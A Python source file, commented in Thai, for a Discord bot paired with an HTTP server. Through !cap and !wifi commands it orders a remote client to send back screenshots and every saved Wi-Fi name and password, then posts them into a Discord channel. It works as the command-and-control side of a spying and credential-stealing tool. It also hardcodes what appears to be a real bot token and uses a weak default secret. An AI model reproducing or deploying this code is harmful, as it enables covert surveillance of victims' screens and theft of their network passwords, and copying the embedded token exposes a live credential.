"""
Discord Bot Server (Updated: !cap & !wifi)
- รับคำสั่ง !cap และ !wifi จาก Discord
- เปิด HTTP endpoint รอรับข้อมูลจาก Client
- ส่งรูปภาพหรือไฟล์ข้อความกลับไปใน Discord channel
"""

import asyncio
import io
import os
import time
from aiohttp import web
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = "MTQ5NzU1MDU5NjMxODgyMjQ5MA.GiTzZF.NqSPwA8XFEEPilT8wWuTS5hwwO38eYeSIhviYw"
HTTP_PORT = int(os.getenv("HTTP_PORT", 8765))
API_SECRET = os.getenv("API_SECRET", "my-secret-key")  # ป้องกัน client แปลกปลอม

# เก็บ pending requests: channel_id -> asyncio.Future
pending: dict[int, asyncio.Future] = {}

# ==================== Discord Bot ====================

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user} (ID: {bot.user.id})")
    print(f"🌐 HTTP server listening on port {HTTP_PORT}")


@bot.command(name="cap")
async def cap(ctx: commands.Context):
    """คำสั่ง !cap - ขอภาพหน้าจอจาก client"""
    channel_id = ctx.channel.id

    if channel_id in pending:
        await ctx.send("⏳ กำลังรอข้อมูลจากคำสั่งก่อนหน้าอยู่...")
        return

    # สร้าง future สำหรับรอรูปจาก client
    loop = asyncio.get_event_loop()
    future: asyncio.Future = loop.create_future()
    pending[channel_id] = future

    await ctx.send("📸 ส่งคำขอไปยัง client แล้ว กรุณารอ...")
    print(f"[BOT] !cap received in channel {channel_id}")

    try:
        # รอรูปสูงสุด 30 วินาที
        image_bytes, data_type = await asyncio.wait_for(future, timeout=30.0)
        
        if data_type == "screenshot":
            filename = f"screenshot_{int(time.time())}.png"
            file = discord.File(fp=io.BytesIO(image_bytes), filename=filename)
            await ctx.send("🖼️ หน้าจอจาก client:", file=file)
            print(f"[BOT] Screenshot sent to channel {channel_id}")

    except asyncio.TimeoutError:
        await ctx.send("❌ หมดเวลา: ไม่ได้รับภาพหน้าจอจาก client ภายใน 30 วินาที")
        print(f"[BOT] Timeout waiting for screenshot in channel {channel_id}")
    finally:
        pending.pop(channel_id, None)


@bot.command(name="wifi")
@commands.is_owner()  # 🔒 ปลอดภัยสูงสุด: เฉพาะเจ้าของบอทเท่านั้นที่ใช้คำสั่งนี้ได้
async def wifi(ctx: commands.Context):
    """คำสั่ง !wifi - ขอรายชื่อและรหัสผ่าน Wi-Fi ทั้งหมดจาก client"""
    channel_id = ctx.channel.id

    if channel_id in pending:
        await ctx.send("⏳ กำลังรอข้อมูลจากคำสั่งก่อนหน้าอยู่...")
        return

    loop = asyncio.get_event_loop()
    future: asyncio.Future = loop.create_future()
    pending[channel_id] = future

    await ctx.send("📡 กำลังดึงข้อมูลรหัสผ่าน Wi-Fi จาก client กรุณารอซักครู่...")
    print(f"[BOT] !wifi received in channel {channel_id}")

    try:
        # รอข้อมูลรหัสผ่าน 20 วินาที
        wifi_text, data_type = await asyncio.wait_for(future, timeout=20.0)
        
        if data_type == "wifi_list":
            # ส่งผลลัพธ์กลับเป็นไฟล์ .txt เผื่อในกรณีที่ข้อความยาวเกินลิมิต Discord
            with io.BytesIO(wifi_text.encode('utf-8')) as text_file:
                discord_file = discord.File(fp=text_file, filename=f"wifi_passwords_{channel_id}.txt")
                await ctx.send("🔐 รายชื่อและรหัสผ่าน Wi-Fi ทั้งหมดจาก Client:", file=discord_file)
            print(f"[BOT] Wi-Fi data sent to channel {channel_id}")
            
    except asyncio.TimeoutError:
        await ctx.send("❌ หมดเวลา: ไม่ได้รับข้อมูล Wi-Fi จาก client")
        print(f"[BOT] Timeout waiting for Wi-Fi data in channel {channel_id}")
    finally:
        pending.pop(channel_id, None)


# ==================== HTTP Server ====================

async def handle_screenshot(request: web.Request) -> web.Response:
    """รับรูปภาพจากการแคปหน้าจอ"""
    auth = request.headers.get("X-API-Secret", "")
    if auth != API_SECRET:
        print(f"[HTTP] Unauthorized request from {request.remote}")
        return web.json_response({"error": "Unauthorized"}, status=401)

    try:
        reader = await request.multipart()
        channel_id = None
        image_bytes = None

        async for field in reader:
            if field.name == "channel_id":
                channel_id = int(await field.read(decode=True))
            elif field.name == "image":
                image_bytes = await field.read(decode=False)

        if channel_id is None or image_bytes is None:
            return web.json_response({"error": "Missing channel_id or image"}, status=400)

        print(f"[HTTP] Received screenshot ({len(image_bytes)} bytes) for channel {channel_id}")

        if channel_id in pending and not pending[channel_id].done():
            pending[channel_id].set_result((image_bytes, "screenshot"))
            return web.json_response({"status": "ok", "channel_id": channel_id})
        else:
            return web.json_response({"error": f"No pending command for channel {channel_id}"}, status=404)

    except Exception as e:
        print(f"[HTTP] Error: {e}")
        return web.json_response({"error": str(e)}, status=500)


async def handle_wifi(request: web.Request) -> web.Response:
    """รับข้อมูลข้อความรหัสผ่าน Wi-Fi"""
    auth = request.headers.get("X-API-Secret", "")
    if auth != API_SECRET:
        return web.json_response({"error": "Unauthorized"}, status=401)

    try:
        data = await request.json()
        channel_id = data.get("channel_id")
        wifi_output = data.get("wifi_data")

        if not channel_id or not wifi_output:
            return web.json_response({"error": "Missing channel_id or wifi_data"}, status=400)

        print(f"[HTTP] Received Wi-Fi data for channel {channel_id}")

        if channel_id in pending and not pending[channel_id].done():
            pending[channel_id].set_result((wifi_output, "wifi_list"))
            return web.json_response({"status": "ok"})
        else:
            return web.json_response({"error": f"No pending command for channel {channel_id}"}, status=404)
            
    except Exception as e:
        print(f"[HTTP] Error: {e}")
        return web.json_response({"error": str(e)}, status=500)


async def handle_status(request: web.Request) -> web.Response:
    """ตรวจสอบสถานะ server"""
    return web.json_response({
        "status": "running",
        "pending_channels": list(pending.keys()),
        "bot_user": str(bot.user) if bot.user else "not connected"
    })


async def start_http_server():
    """เริ่ม HTTP server"""
    app = web.Application()
    app.router.add_post("/screenshot", handle_screenshot)
    app.router.add_post("/wifi", handle_wifi)
    app.router.add_get("/status", handle_status)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()
    print(f"[HTTP] Server started on http://0.0.0.0:{HTTP_PORT}")


# ==================== Main ====================

async def main():
    await asyncio.gather(
        start_http_server(),
        bot.start(BOT_TOKEN)
    )


if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ กรุณาตั้งค่า DISCORD_BOT_TOKEN ในไฟล์ .env")
    else:
        asyncio.run(main())